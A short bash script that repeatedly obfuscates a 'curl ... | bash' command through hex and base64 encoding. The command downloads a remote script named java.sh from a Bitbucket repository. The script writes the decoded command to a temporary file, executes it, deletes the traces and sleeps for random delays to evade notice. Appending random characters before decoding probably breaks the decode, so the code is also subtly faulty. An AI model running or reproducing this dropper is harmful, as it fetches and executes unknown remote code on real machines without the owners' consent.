#!/bin/bash

# Set the number of iterations
iterations=50

# Start the loop
for ((i=1; i<=$iterations; i++)); do
    # Convert the command to hex
    hex_code=$(echo -n " curl -s https://bitbucket.org/kina2007/centos/raw/d53be3d270ec44a915e9843971f8fc81da6a00c4/java.sh | bash" | xxd -p)

    # Encode the hex code in base64
    base64_encoded=$(echo "$hex_code" | base64)

    # Write encoded code to a temporary file
    echo "$base64_encoded" > temp_base64_encoded.txt

    # Add some random characters to the file to make it less predictable
    random_chars=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
    echo "$random_chars" >> temp_base64_encoded.txt

    # Decode the base64 code
    base64_decoded=$(cat temp_base64_encoded.txt | base64 -d)

    # Convert decoded code back to hex
    hex_decoded=$(echo "$base64_decoded" | xxd -r -p)

    # Write the hex code to a temporary file
    echo "$hex_decoded" > temp_hex_decoded.txt

    # Make the file executable
    chmod +x temp_hex_decoded.txt

    # Execute the script
    ./temp_hex_decoded.txt

    # Clean up temporary files
    rm temp_base64_encoded.txt temp_hex_decoded.txt

    # Add a random delay before next iteration
    sleep $((RANDOM % 10))  # Random delay between 0 and 9 seconds
done
